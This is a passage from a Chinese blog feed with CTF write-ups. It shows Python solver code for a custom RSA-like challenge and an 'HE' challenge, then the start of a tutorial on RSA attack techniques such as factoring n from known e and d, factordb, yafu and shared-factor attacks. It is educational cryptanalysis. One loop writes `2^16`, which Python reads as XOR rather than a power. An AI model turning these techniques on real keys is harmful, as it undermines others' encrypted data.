punctuation\">(</span><span class=\"token number\">10</span><span class=\"token operator\">**</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token number\">2023</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    g <span class=\"token operator\">=</span> nextprime<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token operator\">+</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">return</span> seed<span class=\"token punctuation\">,</span> p<span class=\"token punctuation\">,</span> q<span class=\"token punctuation\">,</span> g<span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">,</span> b</pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>g <span class=\"token operator\">=</span> <span class=\"token number\">477221908301</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>n <span class=\"token operator\">=</span> <span class=\"token number\">3316800027546899796299249900490338525446722616927865256312015775762946188822765432534092050609396978713268788263981158799865606788375214514715320762212090700556505831986082588196853742449073887978094469425136388568791343123156410854535956201512370508501035099259640256718574195902438477533011590110397102848237</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>c <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">1055164913936861759601070681328133050501717812617683016760570306135820467684982411801348559225269987267344307291062260464313087313624260892305321033950481761766023104810722884530078669496273907717111088374157435933600032536778307024663155969024389539729313080850409619343987657232845340152570573522505621491603</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1931851107627113585898872797097407306775031283164577426145463830123237346520365715246429128224516824122830942699000943541489810766548629439116718005359410307932157835115818123572788574134272559866149510231173682996794795999813187683826003192711531187198464750488603425072083209561408438176122711585965417614521</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1551562722871551197414863544414517343879371834887856099644139717728598793747909014883607220057480535681811569818345280038106100034854300913500569380554031238944182867302031941796646079530311570715793289486496649040783388744493532753060611388234228588390324510451593705548122570734602832796634689681202286741231</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1023651876808318489905393236446524875536885683951145279330352918602853853447694302817954906550298552070780962780070361906218334252821218710182511457918223412762333039692689232650733728755517977280988908985889489001184280272980160457616272709308635982633848318896773374734511656916563942512330005914504195635337</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1396728575337462242947982357590285697182930985707363439305151790398230329601135817800702179968308661208157769938994960699547956746505619567144059124531141441467752697367504171971237392789440539834528097734120365895796879328931933526487179744144262805264212389440273880262757867643667487471108998309565898550140</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1453463533504342407605898896519240080022740769794850225555335805482946107024146169859390000606299331075843994897074067237384575978609903446750030301027143895789020930399227882365796877224045827151164458601051146128595023893592012624245622790310841426316026640692999628802961860272538252503655414255518715501760</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1734188098997045370459645852270876699525364972973439165430983746851028049030910755833101537881287022509713394813625855156597027177172650956556060878254135655554674984881391846365166915103188598322747593655410268343252535017545199684952748721388752410634453219588167967135997210093573628009136839331824663153793</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1818406699779534791674336722314603769405956761591677237541492728774856474202640994826261621058081466035202157430270600277311013762985807007932699131075589061444374253409259047428068590023426361125116787756419263498989853608265018899170600671857062729998584244286042946872554751935726176233509343237366515496055</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2110224578372551604599780781500885585255551193387191859255137522510922283309200273861267242416082384430111092429514796837475408585393892870687357616822691388215024614592556325867420126356456409478047036410920404373309285912924997672529275515064192566242865116021386155457310508094958076066460836565160158766663</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2734314898963728479033000142813246259568089815870673472287793041182166446660277754410015225328084515035689551402469914691940245194075232038843006330773963709864978333290609196651422643790161828701709625044405435997758911646361737976981113757530651460202152435735130527785501592575959228161259747235316966996201</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1739471523641202810327265297591577752505734842706360370411736439778091326147544302419672571631359072958736775753021245026170089432144181286585140626235576357003165565365063891892930826430042724988983744805552283272774328426496752194454345137886991083709095834420716211261094791420543983657274033006263000308001</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1633898663983021315880232468128344375973343513831947719034245458394560620764964781139703730328146867688272597377577334096990495217511672495842757422665634041029897836855918503387750125829916880997756237547050115217989501050321312969857782569772685504342333296062699773772524035928647801109780999606286385993828</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2112537678434541983455155438675819752939902315253995877210799994924402130339220301952636880746115003202906732626240880709905450899140386894469798680364428340096308752822463895676369272310594240218523872726432713727923523795670705620796663457058026486698132677105423723912284782467583666496889668277422897855894</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1905547764297991895655464005243291135503915929946223070930193716719353276176299511789743603839518852084522626369746403322782494839655535256374875931989375893727796783477880417388275601342018110420306850519458122983579401421887487157678128437062457898630225923910616082141417945487097104341470017921585005839195</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1630980632175864325821097316033633878432776326284540663613296369228947524580758521174085831270740676902007597921338922338753292569093972749572873894743004276366255450934321127243059265543238264842113465756525410587585432397969103939839156270427669725105700322171323451214990724796618974173901579204785639853134</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1292635594284199143868112145043677901879112026663868813926717849446834212062816627479738463908435329107525807167884054744958110007480513132862178759227531512910666918543220836367082924683127302830131548269436108818466390089950442871095849761612140412791941509938044840002050404927809576689887056237959398977136</span><span class=\"token punctuation\">,</span> <span class=\"token number\">310324905489909024824084121400933825021991800897234790712636396737226585989370791111023225013146436434736093215029815413824844103817159675123939343521545095286530759083380706263972198492435276155154974121163635845407636178909244994128230620536729995377720968956797108798428106425780443422242201889180750288981</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2039664189307611343640813803465995308862030571862749481773985218255689925420739493902877140224067949564556711359387139822248613429228142470315108047060724427423331554137247058128807345703801243735370277897914071996533233891938080869481144515547032970678014987378117344692285321118798540031539132443422486844461</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>a <span class=\"token operator\">=</span> <span class=\"token number\">477221</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>isPrime<span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>b <span class=\"token operator\">=</span> <span class=\"token number\">908301</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">100</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    tmp <span class=\"token operator\">=</span> b <span class=\"token operator\">-</span> i</pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token keyword\">if</span> isPrime<span class=\"token punctuation\">(</span>tmp<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>tmp<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        <span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>b <span class=\"token operator\">=</span> <span class=\"token number\">908287</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>p <span class=\"token operator\">=</span> <span class=\"token number\">46060946081700475998019330950462361323376131758358942279882592756596585429914462101036196106577809589925330011092448105798640311237611630449649590724980027</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>q <span class=\"token operator\">=</span> n<span class=\"token operator\">//</span>p</pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>q<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token keyword\">assert</span> p<span class=\"token operator\">*</span>q <span class=\"token operator\">==</span> n</pre></td></tr><tr><td data-num=\"30\"></td><td><pre></pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token operator\">**</span><span class=\"token number\">18</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    tmp <span class=\"token operator\">=</span> p <span class=\"token operator\">-</span> i</pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    seed <span class=\"token operator\">=</span> prevprime<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>tmp <span class=\"token operator\">-</span> <span class=\"token number\">3</span><span class=\"token punctuation\">)</span><span class=\"token operator\">//</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    <span class=\"token keyword\">if</span> gen_parameter<span class=\"token punctuation\">(</span>seed<span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> g <span class=\"token keyword\">and</span> isPrime<span class=\"token punctuation\">(</span>seed<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>seed<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>        <span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>seed <span class=\"token operator\">=</span> <span class=\"token number\">11515236520425118999504832737615590330844032939589735569970648189149146357478615525259049026644452397481332502773112026449660077809402907612412397681244723</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>seed<span class=\"token punctuation\">,</span> p<span class=\"token punctuation\">,</span> q<span class=\"token punctuation\">,</span> g<span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">,</span> b <span class=\"token operator\">=</span> gen_parameter<span class=\"token punctuation\">(</span>seed<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>p<span class=\"token operator\">*</span>q<span class=\"token operator\">==</span>n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>seed<span class=\"token punctuation\">,</span>p<span class=\"token punctuation\">,</span>q<span class=\"token punctuation\">,</span>g<span class=\"token punctuation\">,</span>a<span class=\"token punctuation\">,</span>b<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>后面的加密处理是把 flag 分成若干组 2 比特切片，作为指数求幂。那么可以直接遍历进行正向对照求每组的两字节：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> inverse</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> gmpy2 <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>seed<span class=\"token punctuation\">,</span>p<span class=\"token punctuation\">,</span>q<span class=\"token punctuation\">,</span>g<span class=\"token punctuation\">,</span>a<span class=\"token punctuation\">,</span>b <span class=\"token operator\">=</span> <span class=\"token number\">11515236520425118999504832737615590330844032939589735569970648189149146357478615525259049026644452397481332502773112026449660077809402907612412397681244723</span><span class=\"token punctuation\">,</span> <span class=\"token number\">46060946081700475998019330950462361323376131758358942279882592756596585429914462101036196106577809589925330011092448105798640311237611630449649590724980027</span><span class=\"token punctuation\">,</span> <span class=\"token number\">72008942709594694403611673211304689750184429011003352998590877560169163010126441992458569565729528897224985385713167332316326405903391089957400718064906231</span><span class=\"token punctuation\">,</span> <span class=\"token number\">477221908301</span><span class=\"token punctuation\">,</span> <span class=\"token number\">477221</span><span class=\"token punctuation\">,</span> <span class=\"token number\">908287</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>n <span class=\"token operator\">=</span> <span class=\"token number\">3316800027546899796299249900490338525446722616927865256312015775762946188822765432534092050609396978713268788263981158799865606788375214514715320762212090700556505831986082588196853742449073887978094469425136388568791343123156410854535956201512370508501035099259640256718574195902438477533011590110397102848237</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>c <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">1055164913936861759601070681328133050501717812617683016760570306135820467684982411801348559225269987267344307291062260464313087313624260892305321033950481761766023104810722884530078669496273907717111088374157435933600032536778307024663155969024389539729313080850409619343987657232845340152570573522505621491603</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1931851107627113585898872797097407306775031283164577426145463830123237346520365715246429128224516824122830942699000943541489810766548629439116718005359410307932157835115818123572788574134272559866149510231173682996794795999813187683826003192711531187198464750488603425072083209561408438176122711585965417614521</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1551562722871551197414863544414517343879371834887856099644139717728598793747909014883607220057480535681811569818345280038106100034854300913500569380554031238944182867302031941796646079530311570715793289486496649040783388744493532753060611388234228588390324510451593705548122570734602832796634689681202286741231</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1023651876808318489905393236446524875536885683951145279330352918602853853447694302817954906550298552070780962780070361906218334252821218710182511457918223412762333039692689232650733728755517977280988908985889489001184280272980160457616272709308635982633848318896773374734511656916563942512330005914504195635337</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1396728575337462242947982357590285697182930985707363439305151790398230329601135817800702179968308661208157769938994960699547956746505619567144059124531141441467752697367504171971237392789440539834528097734120365895796879328931933526487179744144262805264212389440273880262757867643667487471108998309565898550140</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1453463533504342407605898896519240080022740769794850225555335805482946107024146169859390000606299331075843994897074067237384575978609903446750030301027143895789020930399227882365796877224045827151164458601051146128595023893592012624245622790310841426316026640692999628802961860272538252503655414255518715501760</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1734188098997045370459645852270876699525364972973439165430983746851028049030910755833101537881287022509713394813625855156597027177172650956556060878254135655554674984881391846365166915103188598322747593655410268343252535017545199684952748721388752410634453219588167967135997210093573628009136839331824663153793</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1818406699779534791674336722314603769405956761591677237541492728774856474202640994826261621058081466035202157430270600277311013762985807007932699131075589061444374253409259047428068590023426361125116787756419263498989853608265018899170600671857062729998584244286042946872554751935726176233509343237366515496055</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2110224578372551604599780781500885585255551193387191859255137522510922283309200273861267242416082384430111092429514796837475408585393892870687357616822691388215024614592556325867420126356456409478047036410920404373309285912924997672529275515064192566242865116021386155457310508094958076066460836565160158766663</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2734314898963728479033000142813246259568089815870673472287793041182166446660277754410015225328084515035689551402469914691940245194075232038843006330773963709864978333290609196651422643790161828701709625044405435997758911646361737976981113757530651460202152435735130527785501592575959228161259747235316966996201</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1739471523641202810327265297591577752505734842706360370411736439778091326147544302419672571631359072958736775753021245026170089432144181286585140626235576357003165565365063891892930826430042724988983744805552283272774328426496752194454345137886991083709095834420716211261094791420543983657274033006263000308001</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1633898663983021315880232468128344375973343513831947719034245458394560620764964781139703730328146867688272597377577334096990495217511672495842757422665634041029897836855918503387750125829916880997756237547050115217989501050321312969857782569772685504342333296062699773772524035928647801109780999606286385993828</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2112537678434541983455155438675819752939902315253995877210799994924402130339220301952636880746115003202906732626240880709905450899140386894469798680364428340096308752822463895676369272310594240218523872726432713727923523795670705620796663457058026486698132677105423723912284782467583666496889668277422897855894</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1905547764297991895655464005243291135503915929946223070930193716719353276176299511789743603839518852084522626369746403322782494839655535256374875931989375893727796783477880417388275601342018110420306850519458122983579401421887487157678128437062457898630225923910616082141417945487097104341470017921585005839195</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1630980632175864325821097316033633878432776326284540663613296369228947524580758521174085831270740676902007597921338922338753292569093972749572873894743004276366255450934321127243059265543238264842113465756525410587585432397969103939839156270427669725105700322171323451214990724796618974173901579204785639853134</span><span class=\"token punctuation\">,</span> <span class=\"token number\">1292635594284199143868112145043677901879112026663868813926717849446834212062816627479738463908435329107525807167884054744958110007480513132862178759227531512910666918543220836367082924683127302830131548269436108818466390089950442871095849761612140412791941509938044840002050404927809576689887056237959398977136</span><span class=\"token punctuation\">,</span> <span class=\"token number\">310324905489909024824084121400933825021991800897234790712636396737226585989370791111023225013146436434736093215029815413824844103817159675123939343521545095286530759083380706263972198492435276155154974121163635845407636178909244994128230620536729995377720968956797108798428106425780443422242201889180750288981</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2039664189307611343640813803465995308862030571862749481773985218255689925420739493902877140224067949564556711359387139822248613429228142470315108047060724427423331554137247058128807345703801243735370277897914071996533233891938080869481144515547032970678014987378117344692285321118798540031539132443422486844461</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>u <span class=\"token operator\">=</span> seed</pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">for</span> ci <span class=\"token keyword\">in</span> c<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">for</span> mi <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token operator\">^</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token keyword\">if</span> ci <span class=\"token operator\">==</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">,</span> mi<span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">)</span><span class=\"token operator\">*</span><span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>u<span class=\"token punctuation\">,</span> g<span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> n<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>long_to_bytes<span class=\"token punctuation\">(</span>mi<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>end<span class=\"token operator\">=</span><span class=\"token string\">''</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    u <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>a <span class=\"token operator\">*</span> u <span class=\"token operator\">+</span> ci<span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> n</pre></td></tr></table></figure><h3 id=\"he\"><a class=\"markdownIt-Anchor\" href=\"#he\">#</a> HE</h3>\n<p>非预期是这样的：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>k <span class=\"token operator\">=</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">'cipher.txt'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>res<span class=\"token operator\">=</span>k<span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">'] ['</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>res<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> res<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>replace<span class=\"token punctuation\">(</span><span class=\"token string\">'['</span><span class=\"token punctuation\">,</span><span class=\"token string\">''</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>res<span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> res<span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>replace<span class=\"token punctuation\">(</span><span class=\"token string\">']'</span><span class=\"token punctuation\">,</span><span class=\"token string\">''</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>res<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>k <span class=\"token operator\">=</span> <span class=\"token string\">''</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>l <span class=\"token operator\">=</span> res<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> res<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">if</span> i <span class=\"token operator\">==</span> l<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'1'</span><span class=\"token punctuation\">,</span>end<span class=\"token operator\">=</span><span class=\"token string\">''</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'0'</span><span class=\"token punctuation\">,</span>end<span class=\"token operator\">=</span><span class=\"token string\">''</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>预期是<span class=\"exturl\" data-url=\"aHR0cHM6Ly96aHVhbmxhbi56aGlodS5jb20vcC8yNjE4NzczOTU=\"> GSW 同态方案</span>，虽然很早就了解过这个，鼓捣好久也没做出来，准备蹲一下出题人的 wp 学习。</p>\n<p>分类: <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vWmltYUJsdWUvY2F0ZWdvcnkvMjIwMjk5Ny5odG1s\">WriteUp</span></p>\n<p>标签: <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vWmltYUJsdWUvdGFnL2NyeXB0by8=\">crypto</span> , <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vWmltYUJsdWUvdGFnL21pc2Mv\">misc</span> , <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vWmltYUJsdWUvdGFnL3dyaXRldXAv\">writeup</span></p>\n",
            "tags": []
        },
        {
            "id": "http://waltcsz.github.io/2023/12/",
            "url": "http://waltcsz.github.io/2023/12/",
            "title": "",
            "date_published": "2023-12-05T13:34:54.846Z",
            "content_html": "<h1 id=\"ctf中rsa套路\"><a class=\"markdownIt-Anchor\" href=\"#ctf中rsa套路\">#</a> CTF 中 RSA 套路</h1>\n<p>以前一直用的是<span class=\"exturl\" data-url=\"aHR0cDovL2JvYmFvLjM2MC5jbi9sZWFybmluZy9kZXRhaWwvMzA1OC5odG1sJUU4JUJGJTk5JUU5JTg3JThDJUU3JTlBJTg0JUVGJUJDJThDJUU1JThGJUFGJUU2JTk4JUFGJUU1JThGJTkxJUU3JThFJUIwJUU4JUJGJTk5JUU5JTg3JThDJUU5JTlEJUEyJUU1JUE1JUJEJUU0JUI5JTg1JUU2JUIyJUExJUU2JTlCJUI0JUU2JTk2JUIwJUU0JUJBJTg2JUVGJUJDJThDJUU2JTgzJUIzJUU0JUJBJTg2JUU2JTgzJUIzJUU4JUJGJTk4JUU2JTk4JUFGJUU4JTg3JUFBJUU1JUI3JUIxJUU1JTlDJUE4JUU2JTk1JUI0JUU3JTkwJTg2JUU0JUI4JTgwJUU0JUI4JThCJUU1JTkwJUE3JUUzJTgwJTgy\"> http://bobao.360.cn/learning/detail/3058.html 这里的，可是发现这里面好久没更新了，想了想还是自己在整理一下吧。</span></p>\n<p>具体 RSA 加解密算法就不介绍了，先看数据提取吧。</p>\n<p><strong>需要注意的是，代码中很多地方用到了 gmpy2 库，安装方法参考<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuY25ibG9ncy5jb20vcGNhdC9wLzU3NDY4MjEuaHRtbA==\"> https://www.cnblogs.com/pcat/p/5746821.html</span></strong></p>\n<h2 id=\"数据提取\"><a class=\"markdownIt-Anchor\" href=\"#数据提取\">#</a> 数据提取</h2>\n<p>一般来说，RSA 基本围绕着 c,m,e,d,p,q,n 这几个参数展开，但是题目一般不会直接给参数，需要我们自己手工提取。</p>\n<ul>\n<li>\n<p>pem 文件：针对这类文件可以直接使用 openssl 提取，大概使用过的方式有：</p>\n<pre><code>openssl   rsautl -encrypt -in FLAG -inkey public.pem -pubin -out flag.enc\nopenssl   rsa -pubin -text -modulus -in warmup -in public.pem\n</code></pre>\n</li>\n<li>\n<p>pcap 文件：针对这类文件可以使用 wireshake follow 一下。这种问题一般都是写了一个交互式 crypto 系统，可能产生多轮交互</p>\n</li>\n<li>\n<p>ppc 模式：这种模式是上述 pcap 文件的交互版，会给一个端口进行一些 crypto 的交互，参数会在交互中给出。</p>\n</li>\n</ul>\n<h2 id=\"模数分解\"><a class=\"markdownIt-Anchor\" href=\"#模数分解\">#</a> 模数分解</h2>\n<h1 id=\"已知epq求d\"><a class=\"markdownIt-Anchor\" href=\"#已知epq求d\">#</a> 已知 e,p,q 求 d</h1>\n<pre><code>d = gmpy2.invert(e, (p-1)*(q-1))\n</code></pre>\n<h1 id=\"已知edn求pq\"><a class=\"markdownIt-Anchor\" href=\"#已知edn求pq\">#</a> 已知 e,d,n 求 p,q</h1>\n<pre><code>import random  \n  \ndef gcd(a, b):  \n   if a &lt; b:  \n     a, b = b, a  \n   while b != 0:  \n     temp = a % b  \n     a = b  \n     b = temp  \n   return a  \n  \ndef getpq(n,e,d):  \n    p = 1  \n    q = 1  \n    while p==1 and q==1:  \n        k = d * e - 1  \n        g = random.randint ( 0 , n )  \n        while p==1 and q==1 and k % 2 == 0:  \n            k /= 2  \n            y = pow(g,k,n)  \n            if y!=1 and gcd(y-1,n)&gt;1:  \n                p = gcd(y-1,n)  \n                q = n/p  \n    return p,q  \n  \ndef main():  \n \n    n = 0xa66791dc6988168de7ab77419bb7fb0c001c62710270075142942e19a8d8c51d053b3e3782a1de5dc5af4ebe99468170114a1dfe67cdc9a9af55d655620bbab  \n    e =  0x10001\n    d =  0x123c5b61ba36edb1d3679904199a89ea80c09b9122e1400c09adcf7784676d01d23356a7d44d6bd8bd50e94bfc723fa87d8862b75177691c11d757692df8881\n\n    p,q = getpq(n,e,d)  \n    print &quot;p: &quot;+hex(p)\n    print &quot;q: &quot;+hex(q)  \n  \nif __name__ == '__main__':  \n    main()\n</code></pre>\n<h1 id=\"在线分解n\"><a class=\"markdownIt-Anchor\" href=\"#在线分解n\">#</a> 在线分解 n</h1>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL2ZhY3RvcmRiLmNvbS8=\">http://factordb.com</span><br>\n 通过在此类网站上查询 n，如果可以分解或者之前分解成功过，那么可以直接得到 p 和 q</p>\n<h1 id=\"yafu分解n\"><a class=\"markdownIt-Anchor\" href=\"#yafu分解n\">#</a> yafu 分解 n</h1>\n<p><img data-src=\"https://i.imgur.com/dVDqGFL.png\" alt=\"img\"><br>\n 直接打开程序，然后输入 factor (<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>n</mi><mo stretchy=\"false\">)</mo><mtext>，</mtext><mi mathvariant=\"normal\">‘</mi></mrow><annotation encoding=\"application/x-tex\">n)，`</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\">n</span><span class=\"mclose\">)</span><span class=\"mord cjk_fallback\">，</span><span class=\"mord\">‘</span></span></span></span>n` 为模数，此方法比上面的在线要好用很多</p>\n<h1 id=\"公约数分解n\"><a class=\"markdownIt-Anchor\" href=\"#公约数分解n\">#</a> 公约数分解 n</h1>\n<p>识别此类题目，通常会发现题目给了多个 n，均不相同，并且都是 2048bit，4096bit 级别，无法正面硬杠，并且明文都没什么联系，e 